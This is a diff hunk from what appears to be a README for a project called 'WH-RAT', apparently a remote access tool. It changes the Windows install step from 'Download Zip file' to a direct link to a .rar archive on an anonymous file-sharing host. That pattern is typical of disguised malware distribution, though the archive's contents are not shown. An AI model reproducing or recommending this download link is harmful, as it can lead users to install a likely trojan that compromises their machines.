@@ -32,7 +32,7 @@ Jdk jre [Here]( https://www.oracle.com/java/technologies/javase-jdk13-downloads.
 
 # 💡 HOW TO INSTALL in WINDOWS
 
-1. Download Zip file 
+1. Download rar file https://cdn-143.anonfiles.com/qfw55fX8y4/8393cf9d-1676203901/WH-RAT-master.rar
 
 2. Open up Windows directory
 
